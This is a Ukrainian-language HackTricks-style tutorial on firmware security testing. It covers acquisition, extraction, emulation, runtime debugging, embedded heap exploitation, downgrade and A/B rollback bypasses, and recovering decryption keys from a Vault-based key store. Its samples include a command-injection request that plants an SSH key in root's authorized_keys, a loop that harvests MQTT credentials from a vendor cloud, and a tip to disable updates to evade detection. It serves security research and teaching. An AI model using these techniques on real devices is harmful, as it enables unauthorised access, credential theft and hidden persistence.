# Аналіз прошивки

{{#include ../../banners/hacktricks-training.md}}

## **Вступ**

### Пов'язані ресурси


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Прошивка є критично важливим програмним забезпеченням, яке забезпечує коректну роботу пристроїв, керуючи взаємодією між апаратними компонентами та програмним забезпеченням, з яким взаємодіють користувачі. Вона зберігається в постійній пам'яті, завдяки чому пристрій отримує доступ до життєво важливих інструкцій одразу після ввімкнення, що зрештою призводить до запуску операційної системи. Дослідження та потенційна модифікація прошивки є критично важливим етапом виявлення вразливостей безпеки.

## **Збір інформації**

**Збір інформації** є критично важливим початковим етапом для розуміння складу пристрою та технологій, які він використовує. Цей процес передбачає збір даних про:

- Архітектуру CPU та операційну систему, на якій він працює
- Особливості bootloader
- Апаратну структуру та datasheets
- Метрики codebase і розташування source
- Зовнішні бібліотеки та типи ліцензій
- Історію оновлень і regulatory certifications
- Архітектурні діаграми та діаграми flow
- Оцінки безпеки та виявлені вразливості

Для цього інструменти **open-source intelligence (OSINT)** є надзвичайно цінними, як і аналіз усіх доступних компонентів open-source software за допомогою ручних та автоматизованих процесів review. Такі інструменти, як [Coverity Scan](https://scan.coverity.com) і [Semmle’s LGTM](https://lgtm.com/#explore), пропонують безкоштовний static analysis, який можна використовувати для пошуку потенційних проблем.

## **Отримання прошивки**

Отримати прошивку можна різними способами, кожен із яких має власний рівень складності:

- **Безпосередньо** з джерела (розробників, виробників)
- **Зібрати** її за наданими інструкціями
- **Завантажити** з офіційних сайтів підтримки
- Використовувати запити **Google dork** для пошуку розміщених файлів прошивки
- Отримати прямий доступ до **cloud storage** за допомогою таких інструментів, як [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Перехоплювати **оновлення** за допомогою man-in-the-middle технік
- **Витягувати** її з пристрою через такі інтерфейси, як **UART**, **JTAG** або **PICit**
- **Перехоплювати** запити на оновлення в комунікаціях пристрою
- Виявляти та використовувати **hardcoded endpoints оновлень**
- **Знімати дамп** із bootloader або мережі
- **Витягувати та зчитувати** чип пам'яті, коли інші способи не спрацьовують, використовуючи відповідні hardware tools

### Логи лише через UART: примусовий root shell через env U-Boot у flash

Якщо UART RX ігнорується (доступні лише логи), все одно можна примусово запустити init shell, **відредагувавши blob середовища U-Boot** офлайн:

1. Зняти дамп SPI flash за допомогою кліпси SOIC-8 і програматора (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Знайти розділ env U-Boot, відредагувати `bootargs`, додавши `init=/bin/sh`, і **перерахувати CRC32 середовища U-Boot** для blob.
3. Перезаписати лише розділ env і перезавантажити пристрій; у UART має з'явитися shell.

Це корисно для embedded-пристроїв, у яких shell bootloader вимкнено, але до розділу env можна отримати доступ для запису через зовнішній доступ до flash.

## Аналіз прошивки

Тепер, коли ви **маєте прошивку**, потрібно отримати з неї інформацію, щоб зрозуміти, як із нею працювати. Для цього можна використовувати різні інструменти:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Якщо за допомогою цих інструментів ви не знайдете багато інформації, перевірте **ентропію** образу за допомогою `binwalk -E <bin>`: якщо ентропія низька, образ, імовірно, не зашифрований. Якщо ентропія висока, образ, імовірно, зашифрований (або певним чином стиснений).

Крім того, ці інструменти можна використовувати для вилучення **файлів, вбудованих у firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Або скористайтеся [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) для перевірки файлу.

### Отримання файлової системи

За допомогою описаних вище інструментів, наприклад `binwalk -ev <bin>`, ви повинні були **вилучити файлову систему**.\
Binwalk зазвичай вилучає її в **папку, названу за типом файлової системи**. Зазвичай це один із таких типів: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ручне вилучення файлової системи

Іноді у своїх сигнатурах binwalk **не має magic byte файлової системи**. У таких випадках використовуйте binwalk, щоб **знайти зміщення файлової системи, вилучити стиснену файлову систему** з бінарного файлу та **вручну вилучити** файлову систему відповідно до її типу, використовуючи наведені нижче кроки.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Виконайте наведену нижче **команду dd**, щоб вилучити файлову систему Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Також можна виконати наведену нижче команду.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Для squashfs (використовується у наведеному вище прикладі)

`$ unsquashfs dir.squashfs`

Після цього файли будуть розташовані в каталозі "`squashfs-root`".

- Файли архівів CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Для файлових систем jffs2

`$ jefferson rootfsfile.jffs2`

- Для файлових систем ubifs із NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Аналіз Firmware

Після отримання firmware важливо дослідити його структуру та потенційні вразливості. Цей процес передбачає використання різних інструментів для аналізу й вилучення цінних даних з образу firmware.

### Інструменти початкового аналізу

Нижче наведено набір команд для початкового аналізу бінарного файлу (позначеного як `<bin>`). Ці команди допомагають визначити типи файлів, вилучити рядки, проаналізувати бінарні дані та зрозуміти структуру розділів і файлової системи:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Щоб оцінити стан шифрування образу, перевіряють **entropy** за допомогою `binwalk -E <bin>`. Низька entropy свідчить про відсутність шифрування, тоді як висока entropy може вказувати на шифрування або стиснення.

Для вилучення **embedded files** рекомендовано використовувати такі інструменти та ресурси, як документація **file-data-carving-recovery-tools** і **binvis.io** для інспекції файлів.

### Вилучення файлової системи

За допомогою `binwalk -ev <bin>` зазвичай можна вилучити файлову систему, часто до каталогу, названого на честь типу файлової системи (наприклад, squashfs, ubifs). Однак, коли **binwalk** не може розпізнати тип файлової системи через відсутні magic bytes, необхідне ручне вилучення. Для цього потрібно використати `binwalk`, щоб знайти offset файлової системи, а потім команду `dd`, щоб вирізати файлову систему:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Після цього, залежно від типу файлової системи (наприклад, squashfs, cpio, jffs2, ubifs), для ручного вилучення вмісту використовуються різні команди.

### Аналіз файлової системи

Після вилучення файлової системи починається пошук вразливостей у системі безпеки. Увага приділяється небезпечним мережевим демонам, hardcoded credentials, API endpoints, функціональності update server, нескомпільованому коду, startup scripts і скомпільованим binary для offline analysis.

**Ключові розташування** та **елементи**, які слід перевірити:

- **etc/shadow** і **etc/passwd** для облікових даних користувачів
- SSL-сертифікати та ключі в **etc/ssl**
- Файли конфігурації та скрипти на потенційні вразливості
- Вбудовані binary для подальшого аналізу
- Поширені web servers і binary IoT-пристроїв

Кілька інструментів допомагають виявити sensitive information і вразливості у файловій системі:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) і [**Firmwalker**](https://github.com/craigz28/firmwalker) для пошуку sensitive information
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) для комплексного аналізу firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) і [**EMBA**](https://github.com/e-m-b-a/emba) для static і dynamic analysis

### Перевірки безпеки скомпільованих binary

Вихідний код і скомпільовані binary, знайдені у файловій системі, необхідно ретельно перевірити на вразливості. Такі інструменти, як **checksec.sh** для Unix binary і **PESecurity** для Windows binary, допомагають виявити незахищені binary, які можна експлуатувати.

## Отримання cloud config і MQTT credentials через похідні URL tokens

Багато IoT hubs отримують конфігурацію для кожного пристрою з cloud endpoint, який має такий вигляд:

- `https://<api-host>/pf/<deviceId>/<token>`

Під час аналізу firmware можна виявити, що `<token>` локально виводиться з ідентифікатора пристрою за допомогою hardcoded secret, наприклад:

- token = MD5( deviceId || STATIC_KEY ) і представлений у вигляді uppercase hex

Ця конструкція дає змогу будь-кому, хто дізнався deviceId і STATIC_KEY, відновити URL і отримати cloud config, часто виявляючи plaintext MQTT credentials і topic prefixes.

Практичний workflow:

1) Витягніть deviceId із UART boot logs

- Під’єднайте UART-адаптер 3.3V (TX/RX/GND) і захопіть logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Шукайте рядки, що виводять шаблон URL-адреси cloud config та адресу брокера, наприклад:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Відновлення STATIC_KEY та алгоритму token із firmware

- Завантажте binaries у Ghidra/radare2 і виконайте пошук шляху до config ("/pf/") або використання MD5.
- Підтвердьте алгоритм (наприклад, MD5(deviceId||STATIC_KEY)).
- Отримайте token у Bash і перетворіть digest на верхній регістр:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Збір cloud-конфігурації та облікових даних MQTT

- Сформуйте URL і отримайте JSON за допомогою curl; обробіть його за допомогою jq, щоб вилучити secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Зловживання незашифрованим MQTT і слабкими ACL для topics (якщо наявні)

- Використовуйте отримані облікові дані, щоб підписатися на topics технічного обслуговування та шукати чутливі події:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Перерахування передбачуваних ідентифікаторів пристроїв (у великому масштабі, з авторизацією)

- У багатьох екосистемах використовуються байти OUI/продукту/типу, за якими йде послідовний суфікс.
- Можна перебирати потенційні ідентифікатори, програмно отримувати токени та завантажувати конфігурації:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Примітки
- Завжди отримуйте явний дозвіл перед спробою масового перерахування.
- За можливості надавайте перевагу емуляції або статичному аналізу для отримання секретів без модифікації цільового обладнання.


Процес емуляції firmware дає змогу виконувати **динамічний аналіз** роботи пристрою або окремої програми. Цей підхід може бути ускладнений залежностями від обладнання чи архітектури, але перенесення кореневої файлової системи або певних бінарних файлів на пристрій із відповідною архітектурою та порядком байтів, наприклад Raspberry Pi, або на попередньо створену віртуальну машину може сприяти подальшому тестуванню.

### Емуляція окремих бінарних файлів

Для дослідження окремих програм важливо визначити порядок байтів і CPU-архітектуру програми.

#### Приклад з архітектурою MIPS

Для емуляції бінарного файлу архітектури MIPS можна використати команду:
```bash
file ./squashfs-root/bin/busybox
```
А щоб встановити необхідні інструменти емуляції:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Для MIPS (big-endian) використовується `qemu-mips`, а для binary з little-endian слід використовувати `qemu-mipsel`.

#### Емуляція архітектури ARM

Для ARM binary процес аналогічний: для емуляції використовується емулятор `qemu-arm`.

### Повна емуляція системи

Такі інструменти, як [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) та інші, спрощують повну емуляцію firmware, автоматизуючи процес і допомагаючи у dynamic analysis.

## Dynamic Analysis на практиці

На цьому етапі для analysis використовується реальне або емульоване середовище пристрою. Важливо зберігати shell-доступ до OS і filesystem. Емуляція може неідеально відтворювати взаємодію з hardware, тому іноді потрібен перезапуск емуляції. Analysis має повторно охоплювати filesystem, exploit-ити відкриті вебсторінки та network services, а також досліджувати вразливості bootloader. Тести цілісності firmware мають вирішальне значення для виявлення потенційних backdoor vulnerabilities.

## Техніки Runtime Analysis

Runtime analysis передбачає взаємодію з process або binary у його operating environment за допомогою таких інструментів, як gdb-multiarch, Frida і Ghidra, для встановлення breakpoint-ів та виявлення vulnerabilities за допомогою fuzzing та інших технік.

Для embedded targets без повноцінного debugger-а **скопіюйте статично лінкований `gdbserver`** на пристрій і під’єднайтеся віддалено:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / відображення повідомлень radio-co-processor

У IoT hubs RF stack часто розділений між **radio MCU** і процесом Linux userland. Корисний workflow полягає у відображенні такого шляху:

1. **RF frame** у повітрі
2. **controller-side parser** на radio MCU
3. **serial/UART text або TLV protocol**, що пересилається до Linux (наприклад `/dev/tty*`)
4. **application dispatcher** в основному daemon
5. **protocol-specific handler / state machine**

Ця архітектура створює дві цілі для reversing замість однієї. Якщо controller перетворює binary radio frames на textual protocol, наприклад `Group,Command,arg1,arg2,...`, відновіть:

- **message groups** і dispatch tables
- Які повідомлення можуть надходити з **network**, а які генерує сам controller
- Точні **manufacturer-specific discriminator fields** (наприклад Zigbee `manufacturer_code` і custom `cluster_command`)
- Які handlers доступні лише під час **commissioning**, discovery або firmware/model download phases

Для Zigbee capture pairing traffic і перевірте, чи target досі використовує default **Link Key** `ZigBeeAlliance09`. Якщо так, sniffing commissioning traffic може розкрити **Network Key**. Zigbee 3.0 install codes зменшують цей exposure, тому зазначте, чи тестований device справді їх enforce-ить.

### Manufacturer-specific protocol handlers і FSM-gated reachability

Vendor-specific Zigbee/ZCL commands часто є кращою ціллю, ніж standardized clusters, оскільки вони передають дані до **custom parsing code** і внутрішніх **FSMs** із менш перевіреною в реальних умовах validation.

Практичний workflow:

- Виконайте reverse engineering command dispatcher, доки не знайдете **vendor-only handler**.
- Відновіть таблиці **FSM state**, **event**, **check**, **action** і **next-state**.
- Визначте **transitional states**, які автоматично переходять далі, а також retry/error branches, що зрештою скидають або звільняють state, контрольований attacker.
- Підтвердьте, які legitimate protocol exchanges потрібні, щоб перевести daemon у vulnerable state, замість припущення, що buggy handler завжди доступний.

Для timing-sensitive protocols packet replay із Python framework може бути надто повільним. Надійніший підхід — емулювати legitimate device на реальному hardware (наприклад **nRF52840**) із vendor-grade stack, щоб можна було надати правильні **endpoints**, **attributes** і timing для commissioning.

### Клас fragmented-download bugs в embedded daemons

Поширений клас firmware bugs виникає у **fragmented blob/model/configuration downloads**:

1. **Перший fragment** (`offset == 0`) зберігає `ctx->total_size` і виділяє `malloc(total_size)`.
2. Наступні fragments перевіряють лише attacker-controlled **packet-local** fields, наприклад `packet_total_size >= offset + chunk_len`.
3. Копіювання виконується через `memcpy(&ctx->buffer[offset], chunk, chunk_len)` без перевірки щодо **original allocated size**.

Це дає attacker можливість надіслати:

- Перший valid fragment із **малим** заявленим total size, щоб змусити виконати мале heap allocation.
- Наступний fragment із **очікуваним offset**, але більшим `chunk_len`.
- Підроблений packet-local size, який проходить свіжі checks, водночас спричиняючи overflow спочатку allocated buffer.

Якщо vulnerable path захищений commissioning logic, exploitation має включати достатню **device emulation**, щоб перевести target у очікуваний model-download або blob-download state перед надсиланням malformed fragments.

### Protocol-driven `free()` triggers

В embedded daemons найпростішим способом запустити heap metadata exploitation часто є не «чекати cleanup», а **примусити власну error handling логіку protocol**:

- Надсилайте malformed follow-up fragments, щоб перевести FSM у **retry** або **error** states.
- Перевищте retry threshold, щоб daemon **скинув context** і звільнив corrupted buffer.
- Використовуйте цей передбачуваний `free()`, щоб запустити allocator-side primitives до того, як процес завершиться з інших причин.

Це особливо корисно проти **musl/uClibc/dlmalloc-like** allocators в embedded Linux, де corruption chunk metadata може перетворити unlink/unbin logic на write primitive. Стабільний pattern полягає в corruption **size field**, щоб перенаправити allocator traversal до **fake chunks**, розміщених усередині overflowed buffer, замість негайного перезапису реальних bin pointers і crash процесу.

## Binary Exploitation and Proof-of-Concept

Розроблення PoC для виявлених vulnerabilities потребує глибокого розуміння architecture target і programming мовами нижчого рівня. Binary runtime protections в embedded systems трапляються рідко, але коли вони присутні, можуть знадобитися techniques на кшталт Return Oriented Programming (ROP).

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc використовує fastbins, подібні до glibc. Пізніше large allocation може запустити `__malloc_consolidate()`, тому будь-який fake chunk має пройти checks (sane size, `fd = 0` і surrounding chunks, які вважаються `"in use"`).
- **Non-PIE binaries under ASLR:** якщо ASLR увімкнено, але main binary є **non-PIE**, адреси in-binary `.data/.bss` залишаються стабільними. Можна націлитися на region, який уже нагадує valid heap chunk header, щоб розмістити fastbin allocation у **function pointer table**.
- **Parser-stopping NUL:** коли виконується JSON parsing, `\x00` у payload може зупинити parsing, зберігаючи trailing attacker-controlled bytes для stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** ROP chain, яка викликає `open("/proc/self/mem")`, `lseek()` і `write()`, може розмістити executable shellcode у відомому mapping і перейти до нього.

## Prepared Operating Systems for Firmware Analysis

Operating systems на кшталт [AttifyOS](https://github.com/adi0x90/attifyos) і [EmbedOS](https://github.com/scriptingxss/EmbedOS) надають pre-configured environments для firmware security testing, оснащені необхідними tools.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS — distro, призначений для security assessment і penetration testing Internet of Things (IoT) devices. Він заощаджує багато часу, надаючи pre-configured environment з усіма необхідними tools.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system на основі Ubuntu 18.04, попередньо оснащений firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Навіть коли vendor реалізує cryptographic signature checks для firmware images, **version rollback (downgrade) protection часто відсутній**. Якщо boot- або recovery-loader лише перевіряє signature за допомогою embedded public key, але не порівнює *version* (або monotonic counter) image, що прошивається, attacker може легітимно встановити **старішу vulnerable firmware, яка все ще має valid signature**, і таким чином повторно активувати patched vulnerabilities.

Типовий attack workflow:

1. **Отримайте старішу signed image**
* Завантажте її з public download portal, CDN або support site vendor.
* Витягніть її з companion mobile/desktop applications (наприклад, з Android APK у `assets/firmware/`).
* Отримайте її зі third-party repositories, таких як VirusTotal, Internet archives, forums тощо.
2. **Завантажте або надайте image device** через будь-який exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT тощо.
* Багато consumer IoT devices exposed *unauthenticated* HTTP(S) endpoints, які приймають Base64-encoded firmware blobs, decode-ять їх server-side і запускають recovery/upgrade.
3. Після downgrade скористайтеся vulnerability, яку було patched у новішому release (наприклад, command-injection filter, доданий пізніше).
4. За бажанням прошийте latest image назад або disable updates, щоб уникнути detection після отримання persistence.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
У вразливій (пониженій) версії firmware параметр `md5` безпосередньо конкатенується в shell-команду без санітизації, що дає змогу інжектувати довільні команди (у цьому випадку — увімкнути доступ root на основі SSH-ключа). У пізніших версіях firmware було додано базовий фільтр символів, але відсутність захисту від downgrade робить це виправлення марним.

### Вилучення Firmware з мобільних застосунків

Багато vendors вбудовують повні образи firmware у свої супровідні мобільні застосунки, щоб застосунок міг оновлювати пристрій через Bluetooth/Wi-Fi. Ці пакети зазвичай зберігаються в APK/APEX у незашифрованому вигляді за такими шляхами, як `assets/fw/` або `res/raw/`. Такі інструменти, як `apktool`, `ghidra` або навіть звичайний `unzip`, дають змогу вилучати підписані образи без фізичного доступу до hardware.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Обхід anti-rollback лише через updater у дизайнах зі слотами A/B

Деякі vendors справді реалізують **ratchet** для захисту від downgrade, але лише всередині логіки *updater* (наприклад, процедури UDS через CAN, recovery-команди або userspace OTA agent). Якщо **bootloader** згодом перевіряє лише підпис/CRC образу та довіряє partition table або метаданим слота, захист від rollback усе ще можна обійти.

Типовий слабкий дизайн:

- Метадані firmware містять і дескриптор версії, і **security ratchet** / монотонний лічильник.
- Updater порівнює ratchet образу зі значенням, збереженим у persistent storage, і відхиляє старіші підписані образи.
- **Bootloader** не аналізує цей ratchet і лише перевіряє header, CRC та signature перед boot.
- Активація слота зберігається окремо в partition table або generation counter для кожного слота й **не має криптографічного зв’язку** з точним digest firmware, який пройшов validation.

Це створює primitive **validate-one-image / boot-another-image** у dual-slot системах. Якщо attacker може змусити updater позначити slot B як наступну boot target за допомогою актуального підписаного образу, а потім перезаписати slot B до reboot, bootloader усе ще може завантажити downgraded image, оскільки довіряє лише вже підтвердженим метаданим слота.

Поширений abuse pattern:

1. Завантажити **актуальну підписану** firmware у passive slot і виконати звичайну validation/switch routine, щоб layout позначив цей slot як наступний active.
2. **Поки що не виконувати reboot**. Повторно увійти в slot-preparation/erase routine у тій самій session.
3. Скористатися застарілим boot-state або застарілою slot-selection logic, щоб updater стер **той самий фізичний slot**, який щойно було promoted.
4. Записати в цей slot **старішу, але все ще підписану** firmware.
5. Пропустити validation routine, яка застосовує ratchet, і безпосередньо виконати reboot.
6. Bootloader вибирає promoted slot, перевіряє лише signature/integrity і завантажує старий образ.

Під час reverse engineering реалізацій A/B update звертайте увагу на:

- Вибір слота, отриманий із **boot-time flags**, які не оновлюються після успішного switch.
- Routine на кшталт `prepare_passive_slot()`, яка стирає slot на основі застарілого state, а не **поточного підтвердженого layout**.
- Функцію на кшталт `part_write_layout()`, яка лише збільшує **generation counter** / active flag і не зберігає hash перевіреного образу.
- Перевірки ratchet, реалізовані в userspace або коді updater, але **відсутні в ROM / bootloader / secure boot stages**.
- Erase або recovery routines, які залишають slot позначеним як bootable навіть після видалення та повторного запису його вмісту.

### Checklist для оцінювання Update Logic

* Чи належно захищені transport/authentication для *update endpoint* (TLS + authentication)?
* Чи порівнює device **version numbers** або **монотонний anti-rollback counter** перед flashing?
* Чи перевіряється image всередині secure boot chain (наприклад, signatures перевіряються ROM code)?
* Чи **bootloader застосовує той самий ratchet**, що й updater, замість перевірки лише signature/CRC?
* Чи **метадані активації слота пов’язані** з перевіреним firmware digest/version, чи можна змінити slot після promotion?
* Після успішного switch слота чи змушений device виконати reboot, або наступні update/erase routines усе ще доступні в тій самій session?
* Чи виконує userland code додаткові sanity checks (наприклад, дозволену partition map, model number)?
* Чи використовують *partial* або *backup* update flows ту саму validation logic?

> 💡  Якщо будь-який із наведених пунктів відсутній, платформа, імовірно, вразлива до rollback attacks.

## Vulnerable firmware для практики

Щоб практикувати пошук вразливостей у firmware, використовуйте наведені нижче проєкти vulnerable firmware як відправну точку.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Відновлення ключів розшифрування firmware зі стану embedded KMS/Vault

Коли update image поєднує невеликі plaintext metadata з великим blob із високою ентропією, спочатку виконайте container triage, а не brute-forcing:

- Виведіть headers, offsets і line boundaries за допомогою `hexdump`, `xxd`, `strings -tx`, `base64 -d` та `binwalk -E`.
- `Salted__` зазвичай означає формат OpenSSL `enc`: наступні 8 байтів є salt, а решта — ciphertext.
- Base64 field, який декодується рівно у `256` байтів, є вагомою ознакою того, що ви маєте справу з RSA-2048 ciphertext, який обгортає random firmware password/session key.
- Detached PGP material у тому самому файлі часто забезпечує лише authenticity; не припускайте, що це механізм confidentiality.

Якщо static key hunting (`grep`, `strings`, пошук PEM/PGP) не дає результатів, виконуйте reverse engineering **operational decrypt path**, а не лише шукайте private keys:

- Декомпілюйте updater / management binary і простежте, хто читає encrypted blob, який helper/API його розгортає та яке logical key name він запитує.
- Виконайте пошук у розпакованій root filesystem для KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), а також unit files та init scripts.
- Розглядайте plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens або локальні KMS auto-unseal scripts як еквівалент private-key material.

Якщо appliance постачається з оригінальними Vault binary та storage backend, відтворити це environment зазвичай простіше, ніж повторно реалізовувати internals Vault:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Маючи root у клонованому KMS:

- Зробіть transit keys експортованими лише всередині ізольованого клону: `vault write transit/keys/<name>/config exportable=true`
- Експортуйте unwrap key: `vault read transit/export/encryption-key/<name>`
- Спробуйте відновлений RSA key з точною парою padding/hash, яку використовує KMS. Невдала розшифровка PKCS#1 v1.5 і невдала стандартна розшифровка OAEP **не доводять**, що key неправильний; багато потоків на базі Vault використовують OAEP із SHA-256, тоді як поширені libraries за замовчуванням використовують SHA-1.
- Якщо payload починається з `Salted__`, точно відтворіть KDF vendor на основі OpenSSL (`EVP_BytesToKey`, часто MD5 на legacy appliances), перш ніж намагатися виконати AES-CBC decryption.

Це перетворює "encrypted firmware" на більш загальну проблему: **відновити operational keys на стороні appliance, а потім офлайн відтворити точні параметри unwrap + KDF**.

## Навчання та сертифікація

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## Посилання

- [Злам firmware за допомогою Claude: навички senior-рівня, автономність junior-рівня](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Практичний IoT Hacking: остаточний посібник з атак на Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Експлуатація zero days у покинутому hardware — блог Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [Як Smart Device за $20 надав мені доступ до вашого дому](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Тепер ви бачите mi: тепер ви Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv — експлуатація Tesla Wall Connector через його charge port connector — частина 2: обхід anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Змусимо його блимати: Over-the-Air Exploitation Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
